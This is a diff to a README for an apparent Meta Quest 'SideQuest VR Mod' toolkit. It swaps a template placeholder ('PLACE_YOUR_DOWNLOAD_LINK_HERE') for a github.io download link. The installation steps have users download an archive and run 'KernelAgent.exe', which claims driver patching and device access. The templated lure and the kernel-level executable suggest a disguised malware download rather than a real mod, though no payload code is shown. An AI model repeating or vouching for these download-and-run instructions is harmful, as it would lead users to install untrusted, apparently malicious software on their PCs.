@@ -2,13 +2,15 @@
 
 SideQuest VR Mod is a toolkit that enhances the SideQuest platform with added patching, dev tools, and automation for Meta Quest 2/3. Sideload, manage, and launch unofficial VR content directly from your PC – no Oculus launcher needed.
 
-[![Download SideQuest Mod](https://img.shields.io/badge/Download-SideQuest_Mod-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download SideQuest Mod](https://img.shields.io/badge/Download-SideQuest_Mod-blueviolet)](https://sidequest-vr-mod-toolkit.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://sidequest-vr-mod-toolkit.github.io/.github
+) section  
 2. 📁 **Extract the folder** anywhere on your PC (e.g. `C:\SideQuestMod`)  
 3. 🖱 **Run the executable file** `KernelAgent.exe` (required to enable device access, driver patching, and auto-launch tools)  
 4. 🧑‍💻 Connect your Quest 2/3 via USB with developer mode enabled  
